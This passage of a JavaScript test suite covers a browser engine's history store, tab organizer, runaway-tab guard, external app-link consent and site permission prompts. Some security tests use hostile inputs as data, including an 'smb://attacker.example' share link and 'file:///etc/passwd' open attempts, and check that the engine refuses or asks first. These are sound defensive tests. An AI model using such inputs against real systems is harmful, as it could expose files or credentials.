  assert.deepEqual(world.files.get(HISTORY_FILE).entries, []);
});

test('imported history survives a restart (round-trip through history.json)', () => {
  const { engine, world } = boot();
  seedHistorySource(world);
  ok(engine.historyImport({ sourceIds: ['s1'] }));
  engine.shutdown();
  const engine2 = new Engine(world.ports());
  assert.deepEqual(engine2.loadProblems, []);
  assert.equal(engine2.historyList({}).total, 2);
});

test('corrupt history.json on boot: empty store, problem noted, no crash', () => {
  const world = new FakeWorld();
  world.files.set(HISTORY_FILE, 'not an object');
  const engine = new Engine(world.ports());
  assert.ok(engine.loadProblems.some((p) => p.includes('history')));
  assert.deepEqual(engine.historyList({}), { entries: [], total: 0 });
});

// ---------------------------------------------------------------- organizer

test('organizeApply files loose tabs into category folders; filed tabs untouched', () => {
  const { engine } = boot();
  const a = ok(engine.tabCreate({ url: 'https://github.com/a', activate: false }));
  const b = ok(engine.tabCreate({ url: 'https://gitlab.com/b', activate: false }));
  const lone = ok(engine.tabCreate({ url: 'https://lonely.net/', activate: false }));
  const home = ok(engine.tabCreate({ url: 'raha://home', activate: false }));

  const r = ok(engine.organizeApply());
  assert.deepEqual(r, { moved: 2, foldersCreated: 1 });

  const snap = engine.snapshot();
  const dev = must(snap.folders.find((f) => f.name === 'Dev'));
  assert.equal(must(snap.tabs.find((t) => t.id === a.tabId)).parentId, dev.id);
  assert.equal(must(snap.tabs.find((t) => t.id === b.tabId)).parentId, dev.id);
  assert.equal(must(snap.tabs.find((t) => t.id === lone.tabId)).parentId, snap.rootId, 'ungroupable tab stays put');
  assert.equal(must(snap.tabs.find((t) => t.id === home.tabId)).parentId, snap.rootId, 'internal page never filed');

  // Second run is a no-op: nothing loose groups anymore.
  assert.deepEqual(ok(engine.organizeApply()), { moved: 0, foldersCreated: 0 });

  // Later loose Dev tabs reuse the SAME folder instead of duplicating it.
  const c = ok(engine.tabCreate({ url: 'https://stackoverflow.com/q', activate: false }));
  const d = ok(engine.tabCreate({ url: 'https://npmjs.com/p', activate: false }));
  assert.deepEqual(ok(engine.organizeApply()), { moved: 2, foldersCreated: 0 });
  const snap2 = engine.snapshot();
  assert.equal(snap2.folders.filter((f) => f.name === 'Dev').length, 1);
  assert.equal(must(snap2.tabs.find((t) => t.id === c.tabId)).parentId, dev.id);
  assert.equal(must(snap2.tabs.find((t) => t.id === d.tabId)).parentId, dev.id);
});

test('organizeApply toasts a summary and preview does not mutate', () => {
  const { engine, world } = boot();
  ok(engine.tabCreate({ url: 'https://github.com/a', activate: false }));
  ok(engine.tabCreate({ url: 'https://gitlab.com/b', activate: false }));

  const preview = engine.organizePreview();
  assert.equal(preview.groups.length, 1);
  assert.equal(preview.groups[0].name, 'Dev');
  assert.equal(preview.groups[0].tabs.length, 2);
  assert.ok(preview.groups[0].tabs.every((t) => typeof t.title === 'string'));
  assert.equal(engine.snapshot().folders.length, 1, 'preview created nothing (root only)');

  ok(engine.organizeApply());
  assert.ok(world.toasts().some((t) => t.kind === 'info' && /Organized 2 tabs into 1 folder/.test(t.text)));
});

// ------------------------------------------------------------ runaway guard

/** Drive n governor ticks with fixed metrics on one tab.
 * @param {Engine} engine @param {FakeWorld} world @param {string} tabId
 * @param {number} memMB @param {number} cpuPct @param {number} n */
function hotTicks(engine, world, tabId, memMB, cpuPct, n) {
  for (let i = 0; i < n; i += 1) {
    world.setTabMetrics(tabId, memMB, cpuPct);
    engine.tick();
  }
}

test('runaway guard: sustained CPU prompts; a short spike never does; calm withdraws it', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://busy.com' }));
  hotTicks(engine, world, tabId, 100, 350, 3);
  assert.equal(engine.snapshot().runaway, null, 'three hot ticks are still a spike');
  hotTicks(engine, world, tabId, 100, 350, 1);
  assert.deepEqual(engine.snapshot().runaway, { tabId, kind: 'cpu' }, 'fourth hot tick prompts');
  hotTicks(engine, world, tabId, 100, 2, 1);
  assert.equal(engine.snapshot().runaway, null, 'calming down withdraws the prompt');
});

test('runaway guard: absolute memory blowup prompts even for an audible tab', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://leak.com' }));
  must(world.viewsByTab.get(tabId)).simulateAudio(true);
  hotTicks(engine, world, tabId, 3000, 5, 2);
  assert.deepEqual(engine.snapshot().runaway, { tabId, kind: 'mem' });
});

test('runaway guard: audible tab burning CPU is exempt while protectAudio is on', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://call.com' }));
  must(world.viewsByTab.get(tabId)).simulateAudio(true);
  hotTicks(engine, world, tabId, 100, 400, 6);
  assert.equal(engine.snapshot().runaway, null, 'video call left alone');
  engine.settingsSet({ protectAudio: false });
  hotTicks(engine, world, tabId, 100, 400, 1);
  assert.deepEqual(engine.snapshot().runaway, { tabId, kind: 'cpu' });
});

test('runaway guard: shared-process memory is never blamed on one tab', () => {
  const { engine, world } = boot();
  const { tabId: a } = ok(engine.tabCreate({ url: 'https://a.com' }));
  const { tabId: b } = ok(engine.tabCreate({ url: 'https://b.com' }));
  must(world.viewsByTab.get(b)).pid = must(world.viewsByTab.get(a)).pid;
  hotTicks(engine, world, a, 3000, 1, 4);
  assert.equal(engine.snapshot().runaway, null, 'memShared exempts the memory streak');
});

test('runaway resolve: sleep terminates the renderer, clears the prompt, toasts', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://busy.com' }));
  hotTicks(engine, world, tabId, 100, 300, 4);
  assert.ok(engine.snapshot().runaway, 'prompt open');
  ok(engine.runawayResolve({ tabId, action: 'sleep' }));
  assert.equal(must(engine.snapshot().tabs.find((t) => t.id === tabId)).state, 'asleep');
  assert.equal(engine.snapshot().runaway, null);
  assert.equal(must(world.viewsByTab.get(tabId)).destroyed, true, 'process actually died');
  assert.ok(world.toasts().some((t) => t.kind === 'sleep' && /Terminated at your request/.test(t.text)));
});

test('runaway resolve: snooze quiets the tab, prompt returns after the window', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://busy.com' }));
  hotTicks(engine, world, tabId, 100, 300, 4);
  ok(engine.runawayResolve({ tabId, action: 'snooze' }));
  assert.equal(engine.snapshot().runaway, null);
  hotTicks(engine, world, tabId, 100, 300, 2);
  assert.equal(engine.snapshot().runaway, null, 'quiet during the snooze');
  world.advanceMinutes(6);
  hotTicks(engine, world, tabId, 100, 300, 1);
  assert.deepEqual(engine.snapshot().runaway, { tabId, kind: 'cpu' }, 'still hot after the snooze');
});

test('runaway guard: turning the setting off silences it entirely', () => {
  const { engine, world } = boot(new FakeWorld(), { runawayGuard: false });
  const { tabId } = ok(engine.tabCreate({ url: 'https://busy.com' }));
  hotTicks(engine, world, tabId, 3000, 400, 6);
  assert.equal(engine.snapshot().runaway, null);
});

test('runaway resolve: rejects unknown tabs and unknown actions', () => {
  const { engine } = boot();
  assert.deepEqual(engine.runawayResolve({ tabId: 'ghost', action: 'sleep' }), { error: 'not running' });
  assert.deepEqual(engine.runawayResolve({ tabId: 'ghost', action: 'nuke' }), { error: 'bad action' });
});

// ------------------------------------------------- context-menu callbacks

test('onSearchSelection opens a search tab next to the source tab', () => {
  const { engine, world } = boot();
  const folder = ok(engine.folderCreate({ name: 'Reading' }));
  const { tabId } = ok(engine.tabCreate({ url: 'https://a.com', folderId: folder.folderId }));
  must(world.viewsByTab.get(tabId)).simulateSearchSelection('  resource\n governor  ');
  const snap = engine.snapshot();
  const searchTab = must(snap.tabs.find((t) => t.id !== tabId));
  assert.ok(searchTab.url.includes('duckduckgo.com'), `search url: ${searchTab.url}`);
  assert.ok(searchTab.url.includes('resource%20governor'), 'selection normalized into the query');
  assert.equal(searchTab.parentId, folder.folderId, 'lands in the same folder as the source');
  assert.equal(snap.activeTabId, searchTab.id, 'search tab activates');
});

test('onSearchSelection ignores empty selections', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://a.com' }));
  must(world.viewsByTab.get(tabId)).simulateSearchSelection('   \n  ');
  assert.equal(engine.snapshot().tabs.length, 1, 'no tab created');
});

// ----------------------------------------------- review-driven regressions

test('search selection with host-shaped text still SEARCHES, never navigates', () => {
  // The menu label promises a search; resolveOmnibox would have loaded
  // "evil-phish.example" directly. Page-controlled text must only ever
  // reach the search engine.
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://a.com' }));
  for (const hostile of ['evil-phish.example', 'http://evil.example/x', 'raha://welcome']) {
    must(world.viewsByTab.get(tabId)).simulateSearchSelection(hostile);
  }
  const others = engine.snapshot().tabs.filter((t) => t.id !== tabId);
  assert.equal(others.length, 3);
  for (const t of others) {
    assert.ok(t.url.startsWith('https://duckduckgo.com/?q='), `must be a search: ${t.url}`);
  }
});

test('runaway guard: shared-pid CPU never prompts (no fair single culprit)', () => {
  const { engine, world } = boot();
  const { tabId: a } = ok(engine.tabCreate({ url: 'https://a.com' }));
  const { tabId: b } = ok(engine.tabCreate({ url: 'https://b.com' }));
  must(world.viewsByTab.get(b)).pid = must(world.viewsByTab.get(a)).pid;
  hotTicks(engine, world, a, 100, 400, 6);
  assert.equal(engine.snapshot().runaway, null, 'neither neighbor gets blamed');
});

test('runaway snooze survives a sleep/wake cycle inside its window', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://busy.com' }));
  hotTicks(engine, world, tabId, 100, 300, 4);
  ok(engine.runawayResolve({ tabId, action: 'snooze' }));
  ok(engine.tabSleep({ tabId }));
  ok(engine.tabActivate({ tabId })); // wake: fresh Runtime
  hotTicks(engine, world, tabId, 100, 300, 5);
  assert.equal(engine.snapshot().runaway, null, 'still quiet — the user said not now');
  world.advanceMinutes(6);
  hotTicks(engine, world, tabId, 100, 300, 5);
  assert.deepEqual(engine.snapshot().runaway, { tabId, kind: 'cpu' }, 'window over, still hot');
});

test('a crash while the prompt is open withdraws it immediately, not next tick', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://busy.com' }));
  hotTicks(engine, world, tabId, 100, 300, 4);
  assert.ok(engine.snapshot().runaway, 'prompt open');
  must(world.viewsByTab.get(tabId)).simulateCrash();
  assert.equal(engine.snapshot().runaway, null, 'no prompt for a dead tab');
});

test('manual sleep of the prompted tab withdraws the prompt immediately', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://busy.com' }));
  hotTicks(engine, world, tabId, 100, 300, 4);
  ok(engine.tabSleep({ tabId }));
  assert.equal(engine.snapshot().runaway, null);
});

test('runawayResolve error paths still clear the prompt from the snapshot', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://busy.com' }));
  hotTicks(engine, world, tabId, 100, 300, 4);
  assert.ok(engine.snapshot().runaway);
  assert.deepEqual(engine.runawayResolve({ tabId, action: 'bogus' }), { error: 'bad action' });
  assert.equal(engine.snapshot().runaway, null, 'prompt gone even though the action failed');
});

test('closing a snoozed tab forgets its snooze', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://busy.com' }));
  hotTicks(engine, world, tabId, 100, 300, 4);
  ok(engine.runawayResolve({ tabId, action: 'snooze' }));
  ok(engine.tabClose({ tabId }));
  assert.equal(engine.runawaySnoozes.size, 0, 'no leak for removed tabs');
});

test('own visits are recorded: navigations count, reloads do not, raha:// never', () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 10 });
  const { tabId } = ok(engine.tabCreate({ url: 'https://first.example/' }));
  let entries = engine.history.entries;
  assert.equal(entries.length, 1);
  assert.equal(entries[0].url, 'https://first.example/');
  assert.equal(entries[0].visitCount, 1);
  assert.equal(entries[0].title, 'Title of https://first.example/', 'onTitle touch-up landed without a second visit');
  // Navigate the same tab elsewhere, then back: two entries, revisit counts.
  engine.navOmnibox({ input: 'https://second.example/', tabId });
  engine.navOmnibox({ input: 'https://first.example/', tabId });
  entries = engine.history.entries;
  assert.equal(entries.length, 2);
  assert.equal(must(entries.find((e) => e.url === 'https://first.example/')).visitCount, 2);
  // Reload = same url on the same renderer = not a new visit.
  const before = must(engine.history.entries.find((e) => e.url === 'https://first.example/')).visitCount;
  engine.navOp({ tabId }, 'reload');
  assert.equal(must(engine.history.entries.find((e) => e.url === 'https://first.example/')).visitCount, before);
  // raha:// pages never enter history (grid/home/welcome).
  const home = ok(engine.tabCreate({ url: 'raha://home' }));
  assert.ok(!engine.history.entries.some((e) => e.url.startsWith('raha:')), 'raha:// recorded');
  engine.tabClose({ tabId: home.tabId });
  // Waking an asleep tab is a revisit.
  engine.tabSleep({ tabId });
  engine.tabActivate({ tabId });
  assert.equal(must(engine.history.entries.find((e) => e.url === 'https://first.example/')).visitCount, before + 1);
  void world;
});

test('recordHistory=false records nothing; flush batches writes to history.json', () => {
  const world = new FakeWorld();
  const { engine } = boot(world, { maxLiveTabs: 10, recordHistory: false });
  ok(engine.tabCreate({ url: 'https://quiet.example/' }));
  assert.equal(engine.history.entries.length, 0, 'recording off must record nothing');
  engine.settingsSet({ recordHistory: true });
  ok(engine.tabCreate({ url: 'https://loud.example/' }));
  assert.equal(engine.history.entries.length, 1);
  // First tick writes (last write epoch 0); a second visit + immediate tick is throttled.
  engine.tick();
  const written1 = world.files.get('history.json');
  assert.ok(written1 && written1.entries.length === 1, 'tick must flush the dirty store');
  ok(engine.tabCreate({ url: 'https://later.example/' }));
  engine.tick();
  assert.equal(world.files.get('history.json').entries.length, 1, 'second write inside the throttle window must wait');
  engine.shutdown();
  assert.equal(world.files.get('history.json').entries.length, 2, 'shutdown force-flushes recorded visits');
});

test('a failed load never clobbers a recorded title; ticker titles dirty once per visit', () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 10 });
  const { tabId } = ok(engine.tabCreate({ url: 'https://intranet.example/' }));
  const entry = () => must(engine.history.entries.find((e) => e.url === 'https://intranet.example/'));
  assert.equal(entry().title, 'Title of https://intranet.example/');
  const view = must(world.viewsByTab.get(tabId));
  engine.tick(); // flushes -> historyDirty false
  // Title-ticker (inbox counters): the tab title updates, the STORE does not.
  view.cb.onTitle('(1) Inbox');
  assert.equal(must(engine.tabNode(tabId)).title, '(1) Inbox', 'tab title still live');
  assert.equal(entry().title, 'Title of https://intranet.example/', 'one recorded title per visit');
  assert.equal(engine.historyDirty, false, 'ticker titles must not re-dirty a multi-MB store');
  // Failed reload: the in-place error page's synthetic title never lands.
  view.simulateLoadFailure();
  assert.equal(entry().title, 'Title of https://intranet.example/');
  assert.ok(!engine.history.entries.some((e) => e.title === 'Failed to load'), 'synthetic title recorded');
});

/** The most recent askExternal event — asks supersede each other, so tests
 * must answer the LATEST id, exactly like the UI does.
 * @param {FakeWorld} world */
function lastAsk(world) {
  const asks = world.events.filter((e) => e.type === 'askExternal');
  return must(asks[asks.length - 1], 'an askExternal event');
}

test('app links: page-triggered zoom link ASKS, and only a yes reaches the OS', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://meet.example/' }));
  const view = must(world.viewsByTab.get(tabId));
  view.cb.onOpenUrl('zoommtg://zoom.us/join?confno=12345');
  const ask = lastAsk(world);
  assert.equal(ask.url, 'zoommtg://zoom.us/join?confno=12345');
  assert.equal(ask.app, 'Zoom');
  assert.deepEqual(world.openedExternally, [], 'the OS must not be touched before consent');
  assert.deepEqual(engine.externalOpen({ id: ask.id }), { ok: true });
  assert.deepEqual(world.openedExternally, ['zoommtg://zoom.us/join?confno=12345']);
  // The pending request is consumed: a second confirm cannot replay it.
  assert.deepEqual(engine.externalOpen({ id: ask.id }), { error: 'nothing pending' });
  assert.equal(world.openedExternally.length, 1);
});

test('app links: a second ask invalidates the first — a stale yes opens NOTHING', () => {
  // The bait-and-switch: page shows the user a Zoom ask, then swaps the
  // pending URL before the click lands. The id the modal displayed must be
  // the only one the engine honors — otherwise the user approves URL A and
  // the OS receives URL B (and "remember" poisons the allow-list with B's
  // scheme forever).
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://evil.example/' }));
  const view = must(world.viewsByTab.get(tabId));
  view.cb.onOpenUrl('zoommtg://zoom.us/join?confno=REAL');
  const askA = lastAsk(world);
  view.cb.onOpenUrl('smb://attacker.example/share');
  const askB = lastAsk(world);
  assert.notEqual(askA.id, askB.id, 'each ask gets its own id');
  assert.deepEqual(engine.externalOpen({ id: askA.id, remember: true }), { error: 'stale ask' });
  assert.deepEqual(world.openedExternally, [], 'a superseded yes must not open anything');
  assert.deepEqual(engine.settings.allowedExternalSchemes, [], 'nor remember anything');
  // The CURRENT ask still works — it names the URL the user is looking at.
  assert.deepEqual(engine.externalOpen({ id: askB.id }), { ok: true });
  assert.deepEqual(world.openedExternally, ['smb://attacker.example/share']);
});

test('app links: declining opens nothing; remember skips the next ask', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://meet.example/' }));
  const view = must(world.viewsByTab.get(tabId));
  view.cb.onOpenUrl('zoommtg://a');
  engine.externalDismiss({ id: lastAsk(world).id });
  assert.deepEqual(world.openedExternally, [], 'declining must open nothing');
  assert.deepEqual(engine.externalOpen({ id: lastAsk(world).id }), { error: 'nothing pending' },
    'a decline clears the request');

  view.cb.onOpenUrl('zoommtg://b');
  engine.externalOpen({ id: lastAsk(world).id, remember: true });
  assert.ok(engine.settings.allowedExternalSchemes.includes('zoommtg'));
  const asksBefore = world.events.filter((e) => e.type === 'askExternal').length;
  view.cb.onOpenUrl('zoommtg://c');
  assert.equal(world.events.filter((e) => e.type === 'askExternal').length, asksBefore,
    'a remembered scheme must not ask again');
  assert.deepEqual(world.openedExternally, ['zoommtg://b', 'zoommtg://c']);
});

test('app links: "always allow" is not a launch hose — rapid repeats ask again', () => {
  // A page looping location='zoommtg://…' must not turn one remembered yes
  // into unlimited app launches: within the quiet window the surplus request
  // downgrades to an ask (visible, answerable), never a silent open.
  const { engine, world } = boot();
  engine.settingsSet({ allowedExternalSchemes: ['zoommtg'] });
  const { tabId } = ok(engine.tabCreate({ url: 'https://evil.example/' }));
  const view = must(world.viewsByTab.get(tabId));
  view.cb.onOpenUrl('zoommtg://one');
  assert.deepEqual(world.openedExternally, ['zoommtg://one'], 'first remembered open is silent');
  view.cb.onOpenUrl('zoommtg://two');
  assert.deepEqual(world.openedExternally, ['zoommtg://one'], 'a rapid second one is NOT');
  assert.equal(lastAsk(world).url, 'zoommtg://two', 'it asks instead');
  world.clock += 4_000;
  view.cb.onOpenUrl('zoommtg://three');
  assert.deepEqual(world.openedExternally, ['zoommtg://one', 'zoommtg://three'],
    'after the quiet window, remembered opens are silent again');
});

test('app links: dangerous schemes are refused outright, never asked, even if remembered', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://evil.example/' }));
  const view = must(world.viewsByTab.get(tabId));
  view.cb.onOpenUrl('file:///etc/passwd');
  assert.equal(world.events.filter((e) => e.type === 'askExternal').length, 0, 'never ask about file:');
  assert.deepEqual(world.openedExternally, []);
  assert.ok(world.toasts().some((t) => /unsupported address/i.test(t.text)), 'user is told');
  // A tampered settings.json must not turn into a launcher either.
  engine.settings.allowedExternalSchemes = ['file', 'javascript'];
  view.cb.onOpenUrl('file:///etc/passwd');
  assert.deepEqual(world.openedExternally, [], 'the sink re-checks, whatever settings claim');
  // …and the refusal toast is rate-limited: a refusal loop is not a toast storm.
  assert.equal(world.toasts().filter((t) => /unsupported address/i.test(t.text)).length, 1);
  world.clock += 4_000;
  view.cb.onOpenUrl('file:///etc/passwd');
  assert.equal(world.toasts().filter((t) => /unsupported address/i.test(t.text)).length, 2,
    'the toast returns once the quiet window passes');
});

test('app links: a missing app is reported, not swallowed', () => {
  const { engine, world } = boot();
  const { tabId } = ok(engine.tabCreate({ url: 'https://meet.example/' }));
  must(world.viewsByTab.get(tabId)).cb.onOpenUrl('zoommtg://x');
  world.shellThrows = true;
  assert.deepEqual(engine.externalOpen({ id: lastAsk(world).id }), { error: 'open failed' });
  assert.ok(world.toasts().some((t) => /could not be opened/i.test(t.text)), 'user sees why nothing happened');
});

// ---------------------------------------------------- site permissions (R-103)

/** Every askPermission payload in order; null = the ask on screen was withdrawn. @param {FakeWorld} world */
function permEvents(world) {
  return world.events.filter((e) => e.type === 'askPermission').map((e) => e.ask);
}
/** What the UI would be showing per the LAST event (null = nothing). @param {FakeWorld} world */
function shownPerm(world) {
  const evts = permEvents(world);
  return evts.length ? evts[evts.length - 1] : null;
}
/** @param {FakeWorld} world */
function lastPermAsk(world) { return must(shownPerm(world), 'a permission ask on screen'); }
/**
 * A page on `tabId` asks — what index.js hands the engine from the privacy adapter.
 * @param {Engine} engine @param {string} tabId @param {string[]} kinds
 * @param {{ host?: string, requestingHost?: string, isMainFrame?: boolean }} [o]
 */
function ask(engine, tabId, kinds, o = {}) {
  const host = o.host ?? 'meet.example';
  return engine.permissionRequest({ tabId, kinds, host, requestingHost: o.requestingHost ?? host, isMainFrame: o.isMainFrame ?? true });
}

test('site permissions: an undecided ask on the ACTIVE tab is shown; once/always/never/dismiss each mean what they say', async () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 10 });
  const { tabId } = ok(engine.tabCreate({ url: 'https://meet.example/room' }));

  // Allow once: granted, nothing remembered, the ask leaves the screen.
  const p1 = ask(engine, tabId, ['microphone', 'camera']);
  const a1 = lastPermAsk(world);
  assert.deepEqual(
    { tabId: a1.tabId, kinds: a1.kinds, host: a1.host, requestingHost: a1.requestingHost, isMainFrame: a1.isMainFrame },
    { tabId, kinds: ['camera', 'microphone'], host: 'meet.example', requestingHost: 'meet.example', isMainFrame: true },
  );
  assert.deepEqual(engine.permissionAnswer({ id: a1.id, decision: 'once' }), { ok: true });
  assert.equal(await p1, true);
  assert.deepEqual(engine.settings.sitePermissions, {}, 'once remembers nothing');
  assert.equal(shownPerm(world), null, 'answered -> withdrawn from the screen');

  // Always allow: granted AND persisted through the settings path.
  const p2 = ask(engine, tabId, ['notifications']);
  assert.deepEqual(engine.permissionAnswer({ id: lastPermAsk(world).id, decision: 'always' }), { ok: true });
  assert.equal(await p2, true);
  // (spread: assert.deepEqual narrows the type, which would hide later kinds from tsc)
  assert.deepEqual({ ...engine.settings.sitePermissions }, { 'meet.example': { notifications: 'allow' } });
  assert.deepEqual(world.files.get(SETTINGS_FILE).sitePermissions, { 'meet.example': { notifications: 'allow' } }, 'persisted');

  // A remembered allow answers silently: no ask, no toast.
  const events = permEvents(world).length;
  const toasts = world.toasts().length;
  assert.equal(await ask(engine, tabId, ['notifications']), true);
  assert.equal(permEvents(world).length, events, 'no ask for a remembered allow');
  assert.equal(world.toasts().length, toasts, 'and no toast');

  // Never: refused and remembered; later requests are refused silently.
  const p3 = ask(engine, tabId, ['geolocation']);
  engine.permissionAnswer({ id: lastPermAsk(world).id, decision: 'never' });
  assert.equal(await p3, false);
  assert.equal(engine.settings.sitePermissions['meet.example']?.geolocation, 'deny');
  assert.equal(await ask(engine, tabId, ['geolocation']), false);
  assert.equal(permEvents(world).length, events + 2, 'only the never-ask and its withdrawal were emitted');
  assert.equal(world.toasts().length, toasts, 'a remembered deny is silent too');

  // Not now (dismiss / Escape / backdrop): refused, nothing remembered…
  const p4 = ask(engine, tabId, ['clipboard']);
  engine.permissionAnswer({ id: lastPermAsk(world).id, decision: 'dismiss' });
  assert.equal(await p4, false);
  assert.equal(engine.settings.sitePermissions['meet.example']?.clipboard, undefined);
  // …so the site asks again next time.
  const p5 = ask(engine, tabId, ['clipboard']);
  const a5 = lastPermAsk(world);
  assert.deepEqual(a5.kinds, ['clipboard']);
  engine.permissionAnswer({ id: a5.id, decision: 'once' });
  assert.equal(await p5, true);
});

test('site permissions: only the ask on screen can be answered — stale ids and bad decisions grant nothing', async () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 10 });
  const { tabId } = ok(engine.tabCreate({ url: 'https://meet.example/' }));
  assert.deepEqual(engine.permissionAnswer({ id: 1, decision: 'once' }), { error: 'stale ask' }, 'nothing pending');
  const p = ask(engine, tabId, ['camera']);
  const { id } = lastPermAsk(world);
  assert.deepEqual(engine.permissionAnswer({ id: id + 1, decision: 'always' }), { error: 'stale ask' });
  assert.deepEqual(engine.permissionAnswer({ id, decision: 'grant' }), { error: 'bad decision' });
  assert.deepEqual(engine.permissionAnswer({ decision: 'once' }), { error: 'stale ask' });
  assert.deepEqual(engine.permissionAnswer({ id: String(id), decision: 'once' }), { error: 'stale ask' }, 'the id is a number, not a string');
  assert.deepEqual(engine.settings.sitePermissions, {}, 'a refused answer remembers nothing');
  assert.deepEqual(engine.permissionAnswer({ id, decision: 'once' }), { ok: true });
  assert.equal(await p, true);
  assert.deepEqual(engine.permissionAnswer({ id, decision: 'once' }), { error: 'stale ask' }, 'an answered ask cannot be answered twice');
});

test('site permissions: a background tab\'s ask waits until that tab is shown; leaving the tab hides it, returning shows it again', async () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 10 });
  const a = ok(engine.tabCreate({ url: 'https://a.example/' })).tabId;
  const b = ok(engine.tabCreate({ url: 'https://b.example/' })).tabId;
  engine.tabActivate({ tabId: a }); // b keeps running in the background
  const p = ask(engine, b, ['camera'], { host: 'b.example' });
  assert.equal(permEvents(world).length, 0, 'never a dialog for a page the user cannot see');
  engine.tabActivate({ tabId: b });
  const shown = lastPermAsk(world);
  assert.equal(shown.tabId, b);
  assert.equal(shown.host, 'b.example');
  engine.tabActivate({ tabId: a });
  assert.equal(shownPerm(world), null, 'switching away withdraws it (the request stays pending)');
  assert.deepEqual(engine.permissionAnswer({ id: shown.id, decision: 'once' }), { error: 'stale ask' }, 'nothing on screen to answer');
  engine.tabShowGrid();
  assert.equal(shownPerm(world), null);
  engine.tabActivate({ tabId: b });
  assert.equal(lastPermAsk(world).id, shown.id, 'back on the tab: the SAME ask returns');
  const events = permEvents(world).length;
  engine.tabActivate({ tabId: b }); // re-activating the shown tab changes nothing
  assert.equal(permEvents(world).length, events);
  assert.deepEqual(engine.permissionAnswer({ id: shown.id, decision: 'once' }), { ok: true });
  assert.equal(await p, true);
});

test('site permissions: one ask on screen at a time — later asks queue in order, identical asks coalesce, the queue is capped', async () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 10 });
  const { tabId } = ok(engine.tabCreate({ url: 'https://meet.example/' }));
  const cam1 = ask(engine, tabId, ['camera']);
  const first = lastPermAsk(world);
  const geo = ask(engine, tabId, ['geolocation']);
  const cam2 = ask(engine, tabId, ['camera'], { requestingHost: 'widget.example', isMainFrame: false }); // same site+kinds -> shares the pending ask
  assert.equal(permEvents(world).length, 1, 'still only the first ask on screen');
  assert.equal(engine.permissionQueues.get(tabId)?.length, 2, 'coalesced: two asks pending, not three');
  engine.permissionAnswer({ id: first.id, decision: 'once' });
  assert.equal(await cam1, true);
  assert.equal(await cam2, true, 'the coalesced twin got the same answer');
  const second = lastPermAsk(world);
  assert.notEqual(second.id, first.id);
  assert.deepEqual(second.kinds, ['geolocation'], 'the queue advances in order');
  engine.permissionAnswer({ id: second.id, decision: 'never' });
  assert.equal(await geo, false);
  assert.equal(shownPerm(world), null);

  // A looping page cannot build an endless backlog: past the cap, refused.
  const { engine: e2, world: w2 } = boot(new FakeWorld(), { maxLiveTabs: 10 });
  const t2 = ok(e2.tabCreate({ url: 'https://loop.example/' })).tabId;
  const KINDS = ['camera', 'microphone', 'geolocation', 'notifications', 'clipboard'];
  /** @type {Promise<boolean>[]} */ const results = [];
  for (let bits = 1; bits < 32; bits += 1) {
    results.push(ask(e2, t2, KINDS.filter((_, i) => bits & (1 << i)), { host: 'loop.example' }));
  }
  assert.equal(e2.permissionQueues.get(t2)?.length, 8, 'queue capped');
  assert.deepEqual(await Promise.all(results.slice(8)), Array(23).fill(false), 'surplus refused, not queued');
  assert.equal(permEvents(w2).length, 1, 'still one on screen');
});

test('site permissions: closing, sleeping, crashing, or leaving the site refuses pending asks and remembers nothing', async () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 10 });
  const { tabId } = ok(engine.tabCreate({ url: 'https://meet.example/room' }));
  const view = () => must(world.viewsByTab.get(tabId), 'view');

  // Same-site navigation keeps the ask; leaving the site withdraws + refuses it.
  const stay = ask(engine, tabId, ['camera']);
  const shown = lastPermAsk(world);
  view().loadURL('https://www.meet.example/other'); // www collapses to the same site
  assert.equal(lastPermAsk(world).id, shown.id, 'still on screen after a same-site navigation');
  view().loadURL('https://elsewhere.example/');
  assert.equal(await stay, false);
  assert.equal(shownPerm(world), null);

  // Sleep.
  view().loadURL('https://meet.example/');
  const slept = ask(engine, tabId, ['microphone']);
  engine.tabSleep({ tabId });
  assert.equal(await slept, false);
  assert.equal(shownPerm(world), null);

  // Crash.
  engine.tabActivate({ tabId }); // wakes it
  const crashed = ask(engine, tabId, ['geolocation']);
  view().simulateCrash();
  assert.equal(await crashed, false);
  assert.equal(shownPerm(world), null);

  // Close.
  engine.tabActivate({ tabId });
  const closed = ask(engine, tabId, ['notifications']);
  engine.tabClose({ tabId });
  assert.equal(await closed, false);
  assert.equal(shownPerm(world), null);
  assert.deepEqual(engine.settings.sitePermissions, {}, 'none of these remembered anything');
});

test('site permissions: a partial memory asks only about the undecided kinds; any blocked kind refuses the pair silently', async () => {
  const { engine, world } = boot(new FakeWorld(), { maxLiveTabs: 10 });
  const { tabId } = ok(engine.tabCreate({ url: 'https://meet.example/' }));
  const cam = ask(engine, tabId, ['camera']);
  engine.permissionAnswer({ id: lastPermAsk(world).id, decision: 'always' });
  assert.equal(await cam, true);
  const both = ask(engine, tabId, ['camera', 'microphone']);
  const a = lastPermAsk(world);
  assert.deepEqual(a.kinds, ['microphone'], 'the camera was already answered');
